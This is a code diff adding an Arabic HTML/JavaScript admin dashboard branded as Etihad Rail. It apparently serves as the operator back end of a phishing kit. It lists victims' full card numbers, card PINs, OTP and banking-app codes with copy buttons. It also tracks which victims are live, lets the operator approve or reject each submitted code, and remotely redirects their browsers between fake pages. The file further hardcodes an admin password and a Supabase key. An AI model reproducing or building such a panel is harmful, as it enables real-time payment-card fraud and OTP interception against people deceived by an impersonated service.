@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة الإدارة — قطارات الاتحاد</title>
+<link rel="icon" href="/favicon.png" type="image/png">
+<style>
+:root{
+  --bg:#f4f5f7;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
+  --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
+  --gold:#C5A572;--gold-light:#f5eedf;--rail:#1a1a2e;
+  --sidebar:#1a1a2e;--sidebar-w:0px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",Tahoma,Arial,sans-serif;height:100%}
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
+
+/* ── Login ── */
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
+  background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
+.login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
+  box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+.login-box img{height:48px;margin-bottom:16px}
+.login-box h1{font-size:24px;font-weight:800;margin-bottom:4px;color:var(--ink)}
+.login-box p{color:var(--muted);font-size:14px;margin-bottom:28px}
+.login-box input{width:100%;padding:16px 20px;border:2px solid var(--line);border-radius:14px;
+  font-size:16px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;transition:.2s}
+.login-box input:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(197,165,114,.15)}
+.login-box button{width:100%;padding:16px;background:var(--gold);color:#fff;border:none;
+  border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
+.login-box button:hover{background:#b08f5a}
+.login-err{color:var(--red);font-size:13px;margin-bottom:10px;display:none}
+
+/* ── Layout ── */
+.layout{display:none;min-height:100vh}
+.main{padding:24px 28px;min-height:100vh}
+
+/* ── Header ── */
+.top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.top-bar h1{font-size:24px;font-weight:800;display:flex;align-items:center;gap:10px}
+.top-bar h1 img{height:36px}
+.top-bar-actions{display:flex;align-items:center;gap:10px}
+.btn-refresh{display:flex;align-items:center;gap:6px;padding:10px 18px;background:var(--card);
+  border:1.5px solid var(--line);border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;
+  font-family:inherit;transition:.2s}
+.btn-refresh:hover{background:var(--bg);border-color:var(--ink)}
+.btn-refresh svg{width:16px;height:16px;fill:var(--muted)}
+.auto-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.btn-logout{padding:10px 18px;background:var(--red);color:#fff;border:none;border-radius:12px;
+  font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
+
+/* ── Stats ── */
+.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
+@media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:500px){.stats-row{grid-template-columns:1fr}}
+.stat-card{background:var(--card);border-radius:16px;padding:20px 22px;
+  box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
+.stat-card::after{content:"";position:absolute;top:0;right:0;width:4px;height:100%;border-radius:0 16px 16px 0}
+.stat-card.s-active{cursor:pointer;transition:.2s}
+.stat-card.s-active:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.1)}
+.stat-card.s-active::after{background:var(--green)}
+.stat-card.s-total::after{background:var(--blue)}
+.stat-card.s-pending::after{background:var(--orange)}
+.stat-card.s-done::after{background:var(--gold)}
+.stat-label{font-size:13px;font-weight:600;color:var(--muted);display:flex;align-items:center;gap:6px;margin-bottom:6px}
+.stat-num{font-size:32px;font-weight:900}
+.stat-card.s-active .stat-num{color:var(--green)}
+.stat-card.s-total .stat-num{color:var(--blue)}
+.stat-card.s-pending .stat-num{color:var(--orange)}
+.stat-card.s-done .stat-num{color:var(--gold)}
+.wifi-icon{display:inline-flex;align-items:center}
+.wifi-icon svg{width:20px;height:20px;fill:var(--green);animation:pulse 1.5s infinite}
+
+/* ── Table ── */
+.card-box{background:var(--card);border-radius:16px;padding:20px 22px;box-shadow:0 1px 3px rgba(0,0,0,.06);margin-bottom:20px}
+.card-box h2{font-size:18px;font-weight:800;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.search-row{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap}
+.search-row input,.search-row select{padding:10px 14px;border:1.5px solid var(--line);border-radius:10px;
+  font-size:13px;font-family:inherit;outline:none;flex:1;min-width:140px}
+.search-row input:focus,.search-row select:focus{border-color:var(--gold)}
+.tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
+th{background:var(--bg);padding:10px 12px;text-align:right;font-weight:700;color:var(--muted);
+  white-space:nowrap;position:sticky;top:0}
+td{padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:middle}
+tr:hover td{background:#fafafa}
+.badge{display:inline-block;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:700}
+.badge-green{background:#d1fae5;color:#065f46}
+.badge-orange{background:#fef3c7;color:#92400e}
+.badge-red{background:#fee2e2;color:#991b1b}
+.badge-blue{background:#dbeafe;color:#1e40af}
+.badge-gray{background:#f3f4f6;color:#4b5563}
+.badge-gold{background:var(--gold-light);color:#8b6914}
+.badge-purple{background:#ede9fe;color:#5b21b6}
+.copy-btn{background:none;border:1px solid var(--line);border-radius:6px;padding:3px 8px;
+  font-size:11px;cursor:pointer;font-family:inherit;color:var(--ink);transition:.15s}
+.copy-btn:hover{background:var(--bg);border-color:var(--gold)}
+.copy-btn:active{background:var(--gold-light)}
+.act-btn{background:none;border:1px solid var(--line);border-radius:8px;padding:5px 10px;
+  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap}
+.act-btn:hover{border-color:var(--gold);color:var(--gold)}
+.act-btn.del{color:var(--red);border-color:var(--red)}
+.act-btn.del:hover{background:#fee2e2}
+.empty-row{text-align:center;padding:40px;color:var(--muted)}
+
+/* ── Modal ── */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;
+  justify-content:center;z-index:999;padding:20px;backdrop-filter:blur(4px)}
+.modal-overlay.open{display:flex}
+.modal-box{background:var(--card);border-radius:20px;padding:28px;width:100%;max-width:600px;
+  max-height:85vh;overflow-y:auto;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+.modal-close{position:absolute;top:14px;left:14px;background:none;border:none;font-size:26px;
+  cursor:pointer;color:var(--muted);line-height:1}
+.modal-box h2{font-size:18px;font-weight:800;margin-bottom:14px}
+
+/* Visitors list in modal */
+.visitors-list{display:flex;flex-direction:column;gap:10px;max-height:60vh;overflow-y:auto;padding-left:4px}
+.visitor-row{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
+.visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px}
+.visitor-head .v-country{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
+.visitor-head .v-page{font-size:11px;background:var(--gold-light);color:#8b6914;padding:3px 10px;border-radius:999px;font-weight:700}
+.visitor-head .v-time{font-size:11px;color:var(--muted)}
+.visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;margin-bottom:8px;word-break:break-all}
+.visitor-actions{display:flex;flex-wrap:wrap;gap:6px}
+.visitor-actions button{flex:1;min-width:calc(50% - 3px);padding:8px 10px;font-size:12px;font-weight:600;
+  border:1px solid var(--line);background:#fff;border-radius:8px;cursor:pointer;font-family:inherit;transition:.15s}
+.visitor-actions button:hover{background:var(--bg);border-color:var(--gold);color:var(--gold)}
+.visitors-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}
+
+/* Detail modal */
+.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.detail-grid .dg-item{background:var(--bg);border-radius:10px;padding:10px 14px}
+.detail-grid .dg-label{font-size:11px;color:var(--muted);margin-bottom:2px}
+.detail-grid .dg-value{font-size:14px;font-weight:700;word-break:break-all}
+.detail-grid .dg-full{grid-column:1/-1}
+
+/* Redirect modal */
+.redir-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.redir-grid button{padding:12px;border:1.5px solid var(--line);background:#fff;border-radius:10px;
+  font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
+.redir-grid button:hover{border-color:var(--gold);background:var(--gold-light);color:var(--ink)}
+
+/* Toast */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--ink);color:#fff;
+  padding:12px 28px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;
+  opacity:0;transition:opacity .3s;pointer-events:none}
+.toast.show{opacity:1}
+</style>
+</head>
+<body>
+
+<!-- Login -->
+<div class="login-wrap" id="loginView">
+  <div class="login-box">
+    <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
+    <h1>لوحة الإدارة</h1>
+    <p>أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
+    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
+    <input type="password" id="loginPass" placeholder="كلمة المرور" autofocus
+      onkeydown="if(event.key==='Enter')doLogin()">
+    <button onclick="doLogin()">دخول</button>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<div class="layout" id="dashView">
+  <div class="main">
+
+    <!-- Header -->
+    <div class="top-bar">
+      <h1>
+        <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
+        لوحة الإدارة
+      </h1>
+      <div class="top-bar-actions">
+        <div class="auto-dot" title="تحديث تلقائي كل 3 ثوانٍ"></div>
+        <button class="btn-refresh" onclick="refresh()">
+          <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+          تحديث
+        </button>
+        <button class="btn-logout" onclick="doLogout()">خروج</button>
+      </div>
+    </div>
+
+    <!-- Stats Row -->
+    <div class="stats-row">
+      <div class="stat-card s-active" onclick="openVisitorsModal()" title="عرض الزوار النشطين">
+        <div class="stat-label">
+          <span class="wifi-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.24 4.24 0 0 0-6 0zm-4-4l2 2a7.07 7.07 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></span>
+          نشط الآن
+        </div>
+        <div class="stat-num" id="sActive">0</div>
+      </div>
+      <div class="stat-card s-total">
+        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-num" id="sTotal">0</div>
+      </div>
+      <div class="stat-card s-pending">
+        <div class="stat-label">قيد الانتظار</div>
+        <div class="stat-num" id="sPending">0</div>
+      </div>
+      <div class="stat-card s-done">
+        <div class="stat-label">مكتمل</div>
+        <div class="stat-num" id="sDone">0</div>
+      </div>
+    </div>
+
+    <!-- Orders -->
+    <div class="card-box">
+      <h2>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 10a4 4 0 0 1-8 0"/><path d="M3.4 5.467a2 2 0 0 0-.4 1.2V20a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6.667a2 2 0 0 0-.4-1.2l-2-2.667A2 2 0 0 0 17 2H7a2 2 0 0 0-1.6.8z"/></svg>
+        الطلبات
+      </h2>
+      <div class="search-row">
+        <input type="text" id="searchInput" placeholder="بحث بالاسم أو الهاتف أو الإيميل..." oninput="renderOrders()">
+        <select id="filterStatus" onchange="renderOrders()">
+          <option value="">جميع الحالات</option>
+          <option value="active">نشط</option>
+          <option value="payment_approved">دفع مقبول</option>
+          <option value="payment_rejected">دفع مرفوض</option>
+          <option value="payment_done">دفع مكتمل</option>
+          <option value="otp_approved">OTP مقبول</option>
+          <option value="otp_rejected">OTP مرفوض</option>
+          <option value="otp_done">OTP مكتمل</option>
+          <option value="app_code_approved">كود التطبيق مقبول</option>
+          <option value="app_code_rejected">كود التطبيق مرفوض</option>
+          <option value="pin_done">PIN مكتمل</option>
+          <option value="pin_rejected">PIN مرفوض</option>
+          <option value="max_code">الحد الأقصى</option>
+        </select>
+      </div>
+      <div class="tbl-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الحالة</th>
+              <th>الدولة</th>
+              <th>الاسم</th>
+              <th>الإيميل</th>
+              <th>الهاتف</th>
+              <th>الصفحة</th>
+              <th>البطاقة</th>
+              <th>OTP / كود</th>
+              <th>التاريخ</th>
+              <th>إجراءات</th>
+            </tr>
+          </thead>
+          <tbody id="ordersBody">
+            <tr><td colspan="11" class="empty-row">جاري التحميل...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- Visitors Modal -->
+<div class="modal-overlay" id="visitorsModal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeModal('visitorsModal')">×</button>
+    <h2>الزوار النشطين الآن (<span id="visitorsCount">0</span>)</h2>
+    <div class="visitors-list" id="visitorsList">
+      <div class="visitors-empty">جاري التحميل...</div>
+    </div>
+  </div>
+</div>
+
+<!-- Visitor Redirect Modal -->
+<div class="modal-overlay" id="visitorRedirectModal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeModal('visitorRedirectModal')">×</button>
+    <h2>إعادة توجيه الزائر</h2>
+    <div class="redir-grid">
+      <button onclick="doVisitorRedirect('/')">الرئيسية</button>
+      <button onclick="doVisitorRedirect('/booking')">الحجز</button>
+      <button onclick="doVisitorRedirect('/offers')">العروض</button>
+      <button onclick="doVisitorRedirect('/network')">خريطة الشبكة</button>
+      <button onclick="doVisitorRedirect('/destinations')">الوجهات</button>
+      <button onclick="doVisitorRedirect('/live-schedule')">الجدول المباشر</button>
+      <button onclick="doVisitorRedirect('/services')">الخدمات</button>
+      <button onclick="doVisitorRedirect('/journey-planner')">مخطط الرحلة</button>
+    </div>
+  </div>
+</div>
+
+<!-- Order Redirect Modal -->
+<div class="modal-overlay" id="orderRedirectModal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeModal('orderRedirectModal')">×</button>
+    <h2>إعادة توجيه الطلب</h2>
+    <div class="redir-grid">
+      <button onclick="doOrderRedirect('/')">الرئيسية</button>
+      <button onclick="doOrderRedirect('/booking')">الحجز</button>
+      <button onclick="doOrderRedirect('/offers')">العروض</button>
+      <button onclick="doOrderRedirect('/network')">خريطة الشبكة</button>
+      <button onclick="doOrderRedirect('/destinations')">الوجهات</button>
+      <button onclick="doOrderRedirect('/live-schedule')">الجدول المباشر</button>
+      <button onclick="doOrderRedirect('/services')">الخدمات</button>
+      <button onclick="doOrderRedirect('/journey-planner')">مخطط الرحلة</button>
+    </div>
+  </div>
+</div>
+
+<!-- Detail Modal -->
+<div class="modal-overlay" id="detailModal">
+  <div class="modal-box" style="max-width:700px">
+    <button class="modal-close" onclick="closeModal('detailModal')">×</button>
+    <h2>تفاصيل الطلب</h2>
+    <div class="detail-grid" id="detailGrid"></div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+const SUPABASE_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
+const SUPABASE_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
+const ADMIN_PASS = "Admin@2026!";
+const REST = SUPABASE_URL + "/rest/v1";
+const HEADERS = {
+  "apikey": SUPABASE_KEY,
+  "Authorization": "Bearer " + SUPABASE_KEY,
+  "Content-Type": "application/json",
+  "Prefer": "return=representation"
+};
+
+let AUTHED = false;
+let ALL_ORDERS = [];
+let LAST_VISITORS = [];
+
+// ─── Auth ───
+function doLogin() {
+  const p = document.getElementById("loginPass").value;
+  if (p === ADMIN_PASS) {
+    AUTHED = true;
+    sessionStorage.setItem("er_admin", "1");
+    document.getElementById("loginView").style.display = "none";
+    document.getElementById("dashView").style.display = "block";
+    refresh();
+  } else {
+    const el = document.getElementById("loginErr");
+    el.style.display = "block";
+    setTimeout(() => el.style.display = "none", 3000);
+  }
+}
+function doLogout() {
+  AUTHED = false;
+  sessionStorage.removeItem("er_admin");
+  document.getElementById("dashView").style.display = "none";
+  document.getElementById("loginView").style.display = "flex";
+}
+function checkAuth() {
+  if (sessionStorage.getItem("er_admin") === "1") {
+    AUTHED = true;
+    document.getElementById("loginView").style.display = "none";
+    document.getElementById("dashView").style.display = "block";
+    refresh();
+  }
+}
+
+// ─── Supabase REST helpers ───
+async function sbGet(table, query) {
+  const url = REST + "/" + table + (query ? "?" + query : "");
+  const res = await fetch(url, { headers: HEADERS });
+  if (!res.ok) return [];
+  return res.json();
+}
+async function sbPatch(table, id, data) {
+  const url = REST + "/" + table + "?id=eq." + id;
+  return fetch(url, { method: "PATCH", headers: { ...HEADERS, "Prefer": "return=minimal" }, body: JSON.stringify(data) });
+}
+async function sbDelete(table, id) {
+  const url = REST + "/" + table + "?id=eq." + id;
+  return fetch(url, { method: "DELETE", headers: HEADERS });
+}
+
+// ─── Load data ───
+async function loadOrders() {
+  if (!AUTHED) return;
+  const data = await sbGet("visitors", "select=*&order=created_at.desc");
+  ALL_ORDERS = data || [];
+  updateStats();
+  renderOrders();
+}
+
+async function loadActiveVisitors() {
+  if (!AUTHED) return;
+  const cutoff = new Date(Date.now() - 60000).toISOString();
+  const data = await sbGet("site_visitors", "select=*&last_seen_at=gte." + encodeURIComponent(cutoff) + "&order=last_seen_at.desc");
+  LAST_VISITORS = data || [];
+  document.getElementById("sActive").textContent = LAST_VISITORS.length;
+  if (document.getElementById("visitorsModal").classList.contains("open")) {
+    renderVisitors(LAST_VISITORS);
+  }
+}
+
+function refresh() {
+  loadOrders();
+  loadActiveVisitors();
+}
+
+// ─── Stats ───
+function updateStats() {
+  document.getElementById("sTotal").textContent = ALL_ORDERS.length;
+  const pending = ALL_ORDERS.filter(o => o.status === "active" || !o.status).length;
+  const done = ALL_ORDERS.filter(o =>
+    ["payment_done", "otp_done", "pin_done", "app_code_approved"].includes(o.status)
+  ).length;
+  document.getElementById("sPending").textContent = pending;
+  document.getElementById("sDone").textContent = done;
+}
+
+// ─── Status helpers ───
+function statusBadge(s) {
+  const map = {
+    active:["نشط","badge-blue"],
+    payment_approved:["دفع مقبول","badge-green"],
+    payment_rejected:["دفع مرفوض","badge-red"],
+    payment_done:["دفع مكتمل","badge-gold"],
+    otp_approved:["OTP مقبول","badge-green"],
+    otp_rejected:["OTP مرفوض","badge-red"],
+    otp_done:["OTP مكتمل","badge-gold"],
+    app_code_approved:["كود مقبول","badge-green"],
+    app_code_rejected:["كود مرفوض","badge-red"],
+    pin_done:["PIN مكتمل","badge-gold"],
+    pin_rejected:["PIN مرفوض","badge-red"],
+    max_code:["الحد الأقصى","badge-purple"],
+  };
+  const [label, cls] = map[s] || [s || "—", "badge-gray"];
+  return `<span class="badge ${cls}">${label}</span>`;
+}
+
+function pageLabel(p) {
+  if (!p) return "—";
+  const labels = {
+    "/":"الرئيسية", "home":"الرئيسية", "booking":"الحجز", "offers":"العروض",
+    "network":"خريطة الشبكة", "destinations":"الوجهات", "live-schedule":"الجدول المباشر",
+    "services":"الخدمات", "journey-planner":"مخطط الرحلة", "terms":"الشروط",
+    "privacy":"الخصوصية", "login":"تسجيل الدخول", "otp":"رمز OTP",
+    "card-pin":"PIN البطاقة", "payment":"الدفع", "checkout":"الدفع",
+    "waiting-approval":"انتظار الموافقة", "success":"النجاح", "app-code":"كود التطبيق",
+    "dashboard":"لوحة التحكم"
+  };
+  const clean = p.replace(/^\/+/, "").replace(/\.html$/, "");
+  return labels[clean] || clean;
+}
+
+function countryFlag(code) {
+  if (!code) return '<span style="font-size:16px">🌍</span>';
+  const flag = code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));
+  return `<span style="font-size:18px">${flag}</span>`;
+}
+
+function timeAgo(iso) {
+  if (!iso) return "";
+  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
+  if (diff < 10) return "الآن";
+  if (diff < 60) return diff + " ث";
+  if (diff < 3600) return Math.floor(diff / 60) + " د";
+  return Math.floor(diff / 3600) + " س";
+}
+
+function formatDate(iso) {
+  if (!iso) return "—";
+  const d = new Date(iso);
+  return d.toLocaleDateString("ar-AE", { month:"short", day:"numeric", hour:"2-digit", minute:"2-digit" });
+}
+
+function maskCard(num) {
+  if (!num) return "";
+  const s = num.replace(/\s/g, "");
+  if (s.length < 8) return s;
+  return s.slice(0, 4) + " •••• " + s.slice(-4);
+}
+
+// ─── Render orders ───
+function renderOrders() {
+  const q = (document.getElementById("searchInput").value || "").toLowerCase().trim();
+  const sf = document.getElementById("filterStatus").value;
+  let list = ALL_ORDERS;
+  if (sf) list = list.filter(o => o.status === sf);
+  if (q) list = list.filter(o =>
+    (o.full_name || "").toLowerCase().includes(q) ||
+    (o.email || "").toLowerCase().includes(q) ||
+    (o.phone || "").includes(q) ||
+    (o.reference || "").toLowerCase().includes(q)
+  );
+  const tbody = document.getElementById("ordersBody");
+  if (!list.length) {
+    tbody.innerHTML = '<tr><td colspan="11" class="empty-row">لا توجد نتائج</td></tr>';
+    return;
+  }
+  tbody.innerHTML = list.map((o, i) => {
+    const cardInfo = o.card_number
+      ? `<span style="font-size:12px;direction:ltr;display:inline-block">${maskCard(o.card_number)}</span>
+         <br><button class="copy-btn" onclick="copyText('${(o.card_number||"").replace(/'/g,"\\'")}')">نسخ رقم</button>
+         ${o.card_pin ? ` <button class="copy-btn" onclick="copyText('${o.card_pin}')">PIN</button>` : ""}`
+      : "—";
+    const otpInfo = o.otp_code
+      ? `<span style="font-weight:700;direction:ltr">${o.otp_code}</span>
+         <button class="copy-btn" onclick="copyText('${o.otp_code}')">نسخ</button>`
+      : o.app_code
+        ? `<span style="font-weight:700;direction:ltr">${o.app_code}</span>
+           <button class="copy-btn" onclick="copyText('${o.app_code}')">نسخ</button>`
+        : "—";
+    return `<tr>
+      <td>${i + 1}</td>
+      <td>${statusBadge(o.status)}</td>
+      <td>${countryFlag(o.country_code)} ${o.country || ""}</td>
+      <td style="font-weight:700">${o.full_name || "—"}</td>
+      <td style="font-size:12px;direction:ltr">${o.email || "—"}</td>
+      <td style="direction:ltr;white-space:nowrap">${o.phone || "—"}</td>
+      <td><span class="badge badge-blue">${pageLabel(o.current_page)}</span></td>
+      <td>${cardInfo}</td>
+      <td>${otpInfo}</td>
+      <td style="font-size:12px;white-space:nowrap">${formatDate(o.created_at)}</td>
+      <td style="white-space:nowrap">
+        <button class="act-btn" onclick="viewDetail('${o.id}')">عرض</button>
+        <button class="act-btn" onclick="openOrderRedirect('${o.id}')">توجيه</button>
+        <button class="act-btn del" onclick="deleteOrder('${o.id}')">حذف</button>
+      </td>
+    </tr>`;
+  }).join("");
+}
+
+// ─── Visitors ───
+function renderVisitors(list) {
+  document.getElementById("visitorsCount").textContent = list.length;
+  const box = document.getElementById("visitorsList");
+  if (!list.length) {
+    box.innerHTML = '<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';
+    return;
+  }
+  box.innerHTML = list.map(v => {
+    const vid = v.visitor_id || v.id || "";
+    const flag = countryFlag(v.country_code);
+    return `
+      <div class="visitor-row">
+        <div class="visitor-head">
+          <div class="v-country">${flag} ${v.country || ""}</div>
+          <span class="v-page">${pageLabel(v.last_page)}</span>
+          <span class="v-time">${timeAgo(v.last_seen_at)}</span>
+        </div>
+        <div class="visitor-sid">${vid}</div>
+        <div class="visitor-actions">
+          <button onclick="openVisitorRedirectFor('${String(vid).replace(/'/g,"\\'")}')">إعادة توجيه</button>
+        </div>
+      </div>
+    `;
+  }).join("");
+}
+
+function openVisitorsModal() {
+  openModal("visitorsModal");
+  renderVisitors(LAST_VISITORS);
+  loadActiveVisitors();
+}
+
+let currentVisitorId = null;
+function openVisitorRedirectFor(vid) {
+  currentVisitorId = vid;
+  openModal("visitorRedirectModal");
+}
+async function doVisitorRedirect(page) {
+  if (!currentVisitorId) return;
+  await sbPatch("site_visitors", currentVisitorId, { redirect_to: page });
+  closeModal("visitorRedirectModal");
+  currentVisitorId = null;
+  showToast("تم إرسال التوجيه");
+  loadActiveVisitors();
+}
+
+// ─── Order actions ───
+function viewDetail(id) {
+  const o = ALL_ORDERS.find(x => String(x.id) === String(id));
+  if (!o) return;
+  const fields = [
+    ["المرجع", o.reference],
+    ["الحالة", o.status],
+    ["الاسم الكامل", o.full_name],
+    ["الإيميل", o.email],
+    ["الهاتف", o.phone],
+    ["الدولة", (o.country_code ? countryFlag(o.country_code) + " " : "") + (o.country || "—")],
+    ["الصفحة الحالية", pageLabel(o.current_page)],
+    ["البنك", o.bank_name],
+    ["نوع البطاقة", o.card_type],
+    ["اسم حامل البطاقة", o.card_name],
+    ["رقم البطاقة", o.card_number],
+    ["PIN البطاقة", o.card_pin],
+    ["رمز OTP", o.otp_code],
+    ["كود التطبيق", o.app_code],
+    ["تاريخ الإنشاء", formatDate(o.created_at)],
+    ["آخر نشاط", formatDate(o.last_activity_at)],
+  ];
+  document.getElementById("detailGrid").innerHTML = fields.map(([label, val]) => {
+    const v = val || "—";
+    const copyBtn = val && typeof val === "string" && val.length > 2
+      ? ` <button class="copy-btn" onclick="copyText('${val.replace(/'/g,"\\'")}')">نسخ</button>` : "";
+    return `<div class="dg-item"><div class="dg-label">${label}</div><div class="dg-value">${v}${copyBtn}</div></div>`;
+  }).join("");
+  openModal("detailModal");
+}
+
+let currentOrderId = null;
+function openOrderRedirect(id) {
+  currentOrderId = id;
+  openModal("orderRedirectModal");
+}
+async function doOrderRedirect(page) {
+  if (!currentOrderId) return;
+  await sbPatch("visitors", currentOrderId, { redirect_to: page, current_page: page.replace(/^\//,"") });
+  closeModal("orderRedirectModal");
+  currentOrderId = null;
+  showToast("تم إرسال التوجيه");
+  loadOrders();
+}
+
+async function deleteOrder(id) {
+  if (!confirm("هل تريد حذف هذا الطلب نهائياً؟")) return;
+  await sbDelete("visitors", id);
+  showToast("تم حذف الطلب");
+  loadOrders();
+}
+
+// ─── Modal helpers ───
+function openModal(id) { document.getElementById(id).classList.add("open"); }
+function closeModal(id) { document.getElementById(id).classList.remove("open"); }
+document.querySelectorAll(".modal-overlay").forEach(el => {
+  el.addEventListener("click", e => { if (e.target === el) el.classList.remove("open"); });
+});
+
+// ─── Toast ───
+function showToast(msg) {
+  const el = document.getElementById("toast");
+  el.textContent = msg;
+  el.classList.add("show");
+  setTimeout(() => el.classList.remove("show"), 2500);
+}
+
+// ─── Copy ───
+function copyText(text) {
+  navigator.clipboard.writeText(text).then(() => showToast("تم النسخ: " + text));
+}
+
+// ─── Init ───
+checkAuth();
+setInterval(() => {
+  if (AUTHED) {
+    loadOrders();
+    loadActiveVisitors();
+  }
+}, 3000);
+</script>
+</body>
+</html>
